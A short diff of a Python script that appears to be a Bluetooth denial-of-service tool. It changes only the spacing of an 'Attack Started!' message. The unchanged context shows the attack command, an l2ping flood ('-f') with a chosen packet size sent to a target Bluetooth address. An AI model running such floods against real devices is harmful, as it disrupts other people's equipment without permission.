@@ -74,7 +74,7 @@ def scan_attack():
         print(countdown_message, end='\r')
         time.sleep(1)
     os.system('clear')
-    print("[*]Attack Started!")
+    print("[*] Attack Started!")
     try:
         os.system(f'l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}')
     except KeyboardInterrupt:
